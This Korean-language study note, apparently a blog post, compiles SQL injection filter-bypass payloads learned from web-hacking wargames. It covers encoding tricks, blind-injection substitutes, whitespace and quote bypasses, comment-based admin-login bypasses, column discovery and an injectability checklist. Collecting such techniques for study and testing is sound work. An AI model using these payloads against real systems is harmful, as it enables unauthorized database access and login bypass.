# SQL Injection 우회기법 정리

지금까지 웹해킹 워게임을 풀면서 깨달은(?) 우회기법을 정리하려 합니다.
모두 수기로 기억나는대로 작성하다보니 빠진 부분도 있을 것 같습니다.
기억나는대로 추가해서 수정하겠습니다.

---

## or, and

```sql
or → ||
and → &&
```

## String Filtering (Ex. preg_match - admin 등)

```sql
admin → 0x61646d696e
admin → 0b0110000101100100011011010110100101101110
admin → char(0x61, 0x64, 0x6d, 0x69, 0x6e)
```
* `char()`의 경우 타 진법으로도 사용 가능

## Blind SQL Injection 시 '=' (Equal) Filtering

```sql
substr('abc',1,1)like('a')
if(strcmp(substr('abc',1,1),'a'),0,1)
substr('abc',1,1)%20in('a')
```

## substr Filtering

```sql
right(left('abc',1),1)
id>0x41444d4941
```
* 'ADMIN'은 'ADMIA'보다 hex값이 크다

## ereg, eregi

- `'admin'` 필터링 시 `'AdmIN'` 등으로 우회 가능
- 맨 앞에 `%00`을 삽입 시 뒤의 문자가 필터링 되지 않음

## replace, replaceAll

- `'admin'` 필터링 시 `'adadminmin'` 등으로 우회 가능

## Numeric Character Filtering

```sql
0 → '!'='@'
1 → '!'='!'
```
* true, false 및 수식을 이용하여 숫자를 표현 가능

## White Space Filtering (%20)

```
%20 → %0a %0b %0c %0d %09
```

## Single Quote Filtering (%27)

- Single Quote 안에서 Double quote를 쓰면 해결되는 경우도 있음
- 특수한 조건에서 `%bf%27`로 Multibyte를 만들어 필터링 우회 가능 (하지만 거의 없는 경우)
- `\\` 백슬래시 문자가 필터링 되어있지 않은 경우:

```sql
select test1 from test where id='\' and pw=' or 1#
```

Parameter: `id=\&pw=%20or%201%23`

## 주석

```sql
#
--
;%00
/* */
```

## 주석을 이용한 SQL Injection

### `#` 주석 활용
`#`의 주석 범위는 1 line이다. `%0a`로 나뉘기 때문에:

```sql
select test1 from test where id='abc'# and pw='%0a or id='admin'%23
```

### `/* */` 주석 활용
```sql
select test1 from test where id='abc'/* and pw=''*/ or id='admin'%23
```

## Blind SQLi - 여러 row 결과에서 where문 사용 불가 시

```sql
max(column_name)
min(column_name)
group_concat(column_name)
```

## 테이블명, 컬럼명 알아내기

```sql
select test1 from test where id='admin' and pw='1234' procedure analyse();
```
* `limit 2,1` 등과 함께 사용하여 필요한 컬럼 명을 한 줄로 뽑아낼 수 있음

## Error Based SQL Injection

```sql
0xfffffffffffff*0xfffffffffffff
```
* Integer 범위 초과 에러가 발생한다

## MultiByte Character SQL Injection

`'test1'` 필드 캐릭터가 멀티바이트(ex. UTF-32 등)일 때:

```sql
substr(hex(test1),1,1)=0x41
```

**MultiByte Character 확인 방법:**
- `>`, `<`로 범위를 찾을 때 문자 범위가 소숫점으로 나오면 (ex. 20.5) 멀티바이트 캐릭터로 추측 가능

## SQL Injection 가능 여부 테스트

1. `'`(싱글쿼터) 사용 시 에러 발생 여부
2. `' and '1'='1` → 정상 출력, `' and '1'='2` → 출력 안됨
3. `' or '1'='1` → 정상 출력
4. 숫자 컬럼 (ex. `idx=23001`) → `idx=23002-1` 정상 출력
5. `'||'` 사용 시 정상 출력 (Oracle + Varchar일 때)
6. 주석: `#`(%23), `--` (--%20), `%0a`
